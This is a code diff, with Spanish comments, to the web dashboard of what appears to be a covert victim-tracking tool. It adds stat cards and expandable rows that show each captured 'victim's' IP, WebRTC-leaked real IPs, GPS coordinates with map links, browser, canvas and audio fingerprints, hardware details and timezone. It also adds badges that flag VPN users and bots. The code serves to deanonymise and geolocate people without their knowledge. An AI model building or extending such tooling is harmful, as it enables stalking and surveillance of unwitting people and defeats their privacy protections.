@@ -172,6 +172,11 @@
             color: #00ff88;
         }
 
+        .location-cache {
+            background: #ffa50044;
+            color: #ffa500;
+        }
+
         .coords-link {
             color: #00d4ff;
             text-decoration: none;
@@ -180,6 +185,89 @@
 
         .coords-link:hover {
             text-decoration: underline;
+        }
+
+        .vpn-badge {
+            display: inline-block;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: bold;
+            background: #ff6b6b44;
+            color: #ff6b6b;
+            margin-left: 5px;
+        }
+
+        .bot-badge {
+            display: inline-block;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: bold;
+            background: #9b59b644;
+            color: #9b59b6;
+            margin-left: 5px;
+        }
+
+        .webrtc-leak {
+            color: #ff6b6b;
+            font-weight: bold;
+        }
+
+        .details-row {
+            background: #0a0e27 !important;
+            display: none;
+        }
+
+        .details-row.show {
+            display: table-row;
+        }
+
+        .details-content {
+            padding: 20px;
+            border-left: 3px solid #00ff88;
+        }
+
+        .details-section {
+            margin-bottom: 15px;
+        }
+
+        .details-section h4 {
+            color: #00ff88;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+
+        .details-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 10px;
+            font-size: 12px;
+        }
+
+        .detail-item {
+            background: #1a1f3a;
+            padding: 8px;
+            border-radius: 4px;
+        }
+
+        .detail-label {
+            color: #888;
+            font-size: 10px;
+            text-transform: uppercase;
+        }
+
+        .detail-value {
+            color: #e0e0e0;
+            margin-top: 3px;
+        }
+
+        tr.clickable {
+            cursor: pointer;
+        }
+
+        tr.clickable:hover {
+            background: #1a1f3a !important;
         }
 
         .loading {
@@ -230,6 +318,14 @@
         <div class="stat-card">
             <h3>Ubicaciones GPS</h3>
             <div class="number" id="gpsLocations">0</div>
+        </div>
+        <div class="stat-card">
+            <h3>VPNs Detectadas</h3>
+            <div class="number" id="vpnCount">0</div>
+        </div>
+        <div class="stat-card">
+            <h3>Bots Detectados</h3>
+            <div class="number" id="botCount">0</div>
         </div>
         <div class="stat-card">
             <h3>Última Captura</h3>
@@ -287,6 +383,13 @@
             const gpsCount = victimsData.filter(v => v.geolocation?.latitude).length;
             document.getElementById('gpsLocations').textContent = gpsCount;
 
+            // ✅ NUEVAS ESTADÍSTICAS
+            const vpnCount = victimsData.filter(v => v.network?.vpnDetection?.likelyVPN).length;
+            document.getElementById('vpnCount').textContent = vpnCount;
+
+            const botCount = victimsData.filter(v => v.device?.isBot).length;
+            document.getElementById('botCount').textContent = botCount;
+
             if (victimsData.length > 0) {
                 const lastVictim = victimsData[victimsData.length - 1];
                 const timeAgo = getTimeAgo(new Date(lastVictim.timestamp));
@@ -307,7 +410,7 @@
                         <tr>
                             <th>#</th>
                             <th>Usuario</th>
-                            <th>IP</th>
+                            <th>IP / WebRTC</th>
                             <th>Ubicación</th>
                             <th>Coordenadas</th>
                             <th>Dispositivo</th>
@@ -321,10 +424,21 @@
             const reversedVictims = [...victimsData].reverse();
             reversedVictims.forEach((victim, index) => {
                 const hasGPS = victim.geolocation?.latitude && victim.geolocation?.longitude;
-                const locationBadge = hasGPS
-                    ? '<span class="location-badge location-gps">GPS</span>'
-                    : '<span class="location-badge location-ip">IP</span>';
 
+                // Determinar badge de ubicación
+                let locationBadge = '';
+                const locationSource = victim.network?.locationSource;
+                if (locationSource === 'gps') {
+                    locationBadge = '<span class="location-badge location-gps">GPS</span>';
+                } else if (locationSource === 'ipapi') {
+                    locationBadge = '<span class="location-badge location-ip">IP</span>';
+                } else if (victim.network?.fromCache) {
+                    locationBadge = '<span class="location-badge location-cache">CACHE</span>';
+                } else {
+                    locationBadge = '<span class="location-badge location-ip">IP</span>';
+                }
+
+                // Coordenadas
                 let coordsHTML = 'N/A';
                 if (hasGPS) {
                     const lat = victim.geolocation.latitude.toFixed(4);
@@ -333,26 +447,199 @@
                     coordsHTML = `<a href="${googleMapsUrl}" target="_blank" class="coords-link">${lat}, ${lon}</a>`;
                 }
 
+                // IP y WebRTC
+                let ipHTML = victim.network?.ip || 'Unknown';
+                if (victim.webRTC?.publicIP && victim.webRTC.publicIP !== 'Unknown' && victim.webRTC.publicIP !== victim.network?.ip) {
+                    ipHTML += `<br><span class="webrtc-leak" title="WebRTC Leak">🔴 ${victim.webRTC.publicIP}</span>`;
+                }
+
+                // Navegador
                 const browser = `${victim.browser?.name || 'Unknown'} ${victim.browser?.version || ''}`;
-                const device = `${victim.device?.type || 'Unknown'} - ${victim.os?.name || 'Unknown'}`;
+
+                // Dispositivo con badges
+                let deviceHTML = `${victim.device?.type || 'Unknown'} - ${victim.os?.name || 'Unknown'}`;
+                if (victim.device?.isBot) {
+                    deviceHTML += '<span class="bot-badge">BOT</span>';
+                }
+
+                // Ubicación con VPN badge
+                let locationHTML = `${locationBadge} ${victim.network?.city || 'Unknown'}, ${victim.network?.country || 'Unknown'}`;
+                if (victim.network?.vpnDetection?.likelyVPN) {
+                    locationHTML += '<span class="vpn-badge" title="Probable VPN/Proxy">VPN</span>';
+                }
+
                 const date = new Date(victim.timestamp).toLocaleString('es-MX');
+                const victimId = `victim-${victimsData.length - index}`;
 
                 tableHTML += `
-                    <tr>
+                    <tr class="clickable" onclick="toggleDetails('${victimId}')">
                         <td>${victimsData.length - index}</td>
                         <td><strong>${victim.username || 'Visitor'}</strong></td>
-                        <td>${victim.network?.ip || 'Unknown'}</td>
-                        <td>${locationBadge} ${victim.network?.city || 'Unknown'}, ${victim.network?.country || 'Unknown'}</td>
+                        <td>${ipHTML}</td>
+                        <td>${locationHTML}</td>
                         <td>${coordsHTML}</td>
-                        <td>${device}</td>
+                        <td>${deviceHTML}</td>
                         <td>${browser}</td>
                         <td>${date}</td>
+                    </tr>
+                    <tr class="details-row" id="details-${victimId}">
+                        <td colspan="8">
+                            ${generateDetailsHTML(victim)}
+                        </td>
                     </tr>
                 `;
             });
 
             tableHTML += '</tbody></table>';
             document.getElementById('tableContainer').innerHTML = tableHTML;
+        }
+
+        function toggleDetails(victimId) {
+            const detailsRow = document.getElementById('details-' + victimId);
+            if (detailsRow) {
+                detailsRow.classList.toggle('show');
+            }
+        }
+
+        function generateDetailsHTML(victim) {
+            let html = '<div class="details-content">';
+
+            // VPN Detection
+            if (victim.network?.vpnDetection) {
+                const vpn = victim.network.vpnDetection;
+                html += `
+                    <div class="details-section">
+                        <h4>🛡️ Detección de VPN/Proxy</h4>
+                        <div class="details-grid">
+                            <div class="detail-item">
+                                <div class="detail-label">Probable VPN</div>
+                                <div class="detail-value">${vpn.likelyVPN ? '⚠️ SÍ' : '✅ NO'}</div>
+                            </div>
+                            <div class="detail-item">
+                                <div class="detail-label">Timezone Mismatch</div>
+                                <div class="detail-value">${vpn.timezoneMismatch ? '⚠️ Sí' : 'No'}</div>
+                            </div>
+                            <div class="detail-item">
+                                <div class="detail-label">WebRTC Leak</div>
+                                <div class="detail-value">${vpn.webRTCLeak ? '⚠️ Sí' : 'No'}</div>
+                            </div>
+                            <div class="detail-item">
+                                <div class="detail-label">ISP Sospechoso</div>
+                                <div class="detail-value">${vpn.suspiciousISP ? '⚠️ Sí' : 'No'}</div>
+                            </div>
+                        </div>
+                    </div>
+                `;
+            }
+
+            // WebRTC Info
+            if (victim.webRTC) {
+                html += `
+                    <div class="details-section">
+                        <h4>🌐 WebRTC Information</h4>
+                        <div class="details-grid">
+                            <div class="detail-item">
+                                <div class="detail-label">IP Local</div>
+                                <div class="detail-value">${victim.webRTC.localIP || 'N/A'}</div>
+                            </div>
+                            <div class="detail-item">
+                                <div class="detail-label">IP Pública (WebRTC)</div>
+                                <div class="detail-value">${victim.webRTC.publicIP || 'N/A'}</div>
+                            </div>
+                            ${victim.webRTC.allIPs ? `
+                                <div class="detail-item" style="grid-column: span 2;">
+                                    <div class="detail-label">Todas las IPs</div>
+                                    <div class="detail-value">${victim.webRTC.allIPs.join(', ')}</div>
+                                </div>
+                            ` : ''}
+                        </div>
+                    </div>
+                `;
+            }
+
+            // Fingerprints
+            if (victim.fingerprints) {
+                html += `
+                    <div class="details-section">
+                        <h4>🔍 Fingerprints</h4>
+                        <div class="details-grid">
+                            <div class="detail-item">
+                                <div class="detail-label">Canvas</div>
+                                <div class="detail-value">${victim.fingerprints.canvas?.substring(0, 20) || 'N/A'}...</div>
+                            </div>
+                            <div class="detail-item">
+                                <div class="detail-label">WebGL Renderer</div>
+                                <div class="detail-value">${victim.fingerprints.webglRenderer || 'N/A'}</div>
+                            </div>
+                            ${victim.fingerprints.audio ? `
+                                <div class="detail-item">
+                                    <div class="detail-label">Audio Hash</div>
+                                    <div class="detail-value">${victim.fingerprints.audio.hash || 'N/A'}</div>
+                                </div>
+                                <div class="detail-item">
+                                    <div class="detail-label">Audio Sample Rate</div>
+                                    <div class="detail-value">${victim.fingerprints.audio.sampleRate || 'N/A'} Hz</div>
+                                </div>
+                            ` : ''}
+                        </div>
+                    </div>
+                `;
+            }
+
+            // Device & Hardware
+            html += `
+                <div class="details-section">
+                    <h4>💻 Dispositivo & Hardware</h4>
+                    <div class="details-grid">
+                        <div class="detail-item">
+                            <div class="detail-label">Tipo</div>
+                            <div class="detail-value">${victim.device?.type || 'Unknown'}</div>
+                        </div>
+                        <div class="detail-item">
+                            <div class="detail-label">CPU Cores</div>
+                            <div class="detail-value">${victim.device?.cpuCores || 'N/A'}</div>
+                        </div>
+                        <div class="detail-item">
+                            <div class="detail-label">Memoria</div>
+                            <div class="detail-value">${victim.device?.memory || 'N/A'}</div>
+                        </div>
+                        <div class="detail-item">
+                            <div class="detail-label">Bot</div>
+                            <div class="detail-value">${victim.device?.isBot ? '⚠️ Sí' : 'No'}</div>
+                        </div>
+                        <div class="detail-item">
+                            <div class="detail-label">Headless</div>
+                            <div class="detail-value">${victim.device?.isHeadless ? '⚠️ Sí' : 'No'}</div>
+                        </div>
+                    </div>
+                </div>
+            `;
+
+            // Timezone & Location
+            if (victim.timezoneInfo) {
+                html += `
+                    <div class="details-section">
+                        <h4>🕐 Timezone & Locale</h4>
+                        <div class="details-grid">
+                            <div class="detail-item">
+                                <div class="detail-label">Timezone</div>
+                                <div class="detail-value">${victim.timezoneInfo.timezone || 'N/A'}</div>
+                            </div>
+                            <div class="detail-item">
+                                <div class="detail-label">Offset</div>
+                                <div class="detail-value">${victim.timezoneInfo.offset || 'N/A'} min</div>
+                            </div>
+                            <div class="detail-item">
+                                <div class="detail-label">Locale</div>
+                                <div class="detail-value">${victim.timezoneInfo.locale || 'N/A'}</div>
+                            </div>
+                        </div>
+                    </div>
+                `;
+            }
+
+            html += '</div>';
+            return html;
         }
 
         function getTimeAgo(date) {
